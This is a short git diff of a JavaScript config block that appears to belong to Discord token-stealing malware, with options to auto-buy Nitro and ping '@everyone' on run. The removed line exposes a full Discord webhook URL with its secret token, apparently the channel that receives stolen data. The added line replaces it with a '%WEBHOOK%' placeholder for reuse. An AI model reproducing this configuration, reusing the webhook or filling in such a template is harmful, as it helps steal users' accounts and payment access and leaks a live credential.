@@ -11,7 +11,7 @@ function sleep(ms) {
 }
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1208130482123055145/8XTsyApwborD6qJbAXJK4z7m7waxwRUq930TCqYjnSfKaSlp23gKntRPMHTZGKYZoOkr',
+  webhook: "%WEBHOOK%",
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
